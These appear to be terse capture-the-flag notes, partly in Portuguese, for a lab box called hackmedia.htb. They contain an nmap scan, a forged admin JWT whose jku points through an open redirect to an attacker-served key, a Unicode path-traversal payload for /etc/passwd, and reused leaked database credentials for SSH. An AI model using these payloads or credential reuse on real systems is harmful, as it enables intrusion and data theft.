@@ -1,0 +1,58 @@
+nmap -sC -sV -Ao nmap 10.10.11.126 -Pn
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-29 13:48 EST
+Nmap scan report for 10.10.11.126
+Host is up (0.12s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA)
+|   256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA)
+|_  256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Hackmedia
+|_http-generator: Hugo 0.83.1
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.26 seconds
+
+/register	/criar conta
+/login
+f12
+eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiZ2xybiJ9.iktHdXLzvfEJ2ipNuPexXOHxlx6e9Mw1z1F5iukaQe_F7NB0vpCeUv91Kfq5dKzrFtBQJfp0Sk0EHa7HNFo6_F8DO88x5ypTBZnMe2q9Cx5EX3zyXKpbYWPKYVpul67q8apphLIJ5vG5FIxe96v2wv5MyFs7OoVoVYNBfJjQ7caZcvdsw9F3lNuEqff_8Hk7tBy0szj-2t9ICKv6DoKJ6AiLWTKB0llLJqXuTslFGOfnBkuralz0FlCnuOKEWmRIeMU_79B2ujzSVlQrlmsv9Bx4pZAlb_yfxPjC3YAdIvddSXoCoIzSA01Z-U-lfskVJiXgUAWVt8xhn4qNHiqVAg
+
+
+https://jwt.io/
+  "jku": "http://hackmedia.htb/static/jwks.json"
+
+https://mkjwk.org/
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE0LjExODo4MDAwL2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.oxwI3-apWuyrpZcqiZx998fK-90rvpQQZASRKgl28jOBCyDGB4AjXeIiUEChkAOZ4jGaX6C4E0hhej7COdkG8eeSVNCwY8jKG5S5kGNVxXFWAKcuEAXpwiI_c5HtFQfyHgEfCfTSJ7jH_PNqdy9sLLGNMbKwAb-Net1OmZiLmICeHt6fd-Fd7qGwHmV5VjQs-vMag_6fmevNdZm4B0osPGIz9uYtHWh8hn4D0LiatMy2RYHTuTp_1rQBf044LHwF-JMcys_MesRz3sq_58psyubtzPFIE5cuVibDwiUDeQE9gv58XV8AKo_Ih01LjTjG7CeqlisZRQckH8Herorjhw
+
+
+wget http://hackmedia.htb/static/jwks.json
+
+Editar esse arquivo e trocar o parametro "n" pra igual o do site https://mkjwk.org/ que foi criado a pub key
+
+Salvar e depois ir no site colcoar no campo e dar f5
+
+Saved Reports
+
+https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html
+
+︰/︰/︰/︰/etc/passwd
+
+
+mysql_host: "localhost"
+mysql_user: "code"
+mysql_password: "B3stC0d3r2021@@!"
+mysql_db: "user"
+
+ssh code@hackmedia.htb
+B3stC0d3r2021@@!
+
+sudo -l
+
+File:///root/.ssh/id_rsa
